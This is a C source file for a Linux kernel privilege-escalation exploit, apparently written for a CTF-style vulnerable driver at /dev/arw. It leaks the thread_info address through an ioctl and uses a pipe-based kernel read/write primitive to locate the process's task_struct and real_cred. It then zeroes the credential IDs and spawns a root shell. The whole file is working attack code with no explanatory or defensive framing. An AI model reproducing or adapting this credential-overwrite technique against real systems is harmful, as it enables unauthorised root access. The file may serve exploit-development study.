#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
struct param
{
    size_t len;
    char* buf;
    char* addr;
};

int pipefd[2];

int kmemcpy(void *dest, void *src, size_t size)
{
    write(pipefd[1], src, size);
    read(pipefd[0], dest, size);
    return size;
}

int main(void)
{
    int fd;
    char buf[16];

    fd = open("/dev/arw", O_RDWR);
    if (fd == -1) {
        printf("open hello device failed!\n");
        return -1;
    }

    struct param p;
    ioctl(fd, 5, &p);
    printf("got thread_info: %p\n", p.addr);
    char * info = p.addr;
    int ret_val = pipe(pipefd);
    if (ret_val < 0) {
        printf("pipe failed: %d\n", ret_val);
        exit(1);
    }

    kmemcpy(buf, info, 16);
    void* task_addr = (void *)(*(long *)buf);
    //p &((struct task_struct*)0)->real_cred
    // 0x5a8
    kmemcpy(buf, task_addr+0x5f0, 16);
    char* real_cred = (void *)(*(long *)buf);
    printf("task_addr: %p\n", task_addr);
    printf("real_cred: %p\n", real_cred);
    char* cred_ids = malloc(0x1c);
    memset(cred_ids, 0, 0x1c);

    kmemcpy(real_cred, cred_ids, 0x1c);

    kmemcpy(real_cred+8, &real_cred, 8);
    system("sh");

    return 0;
}

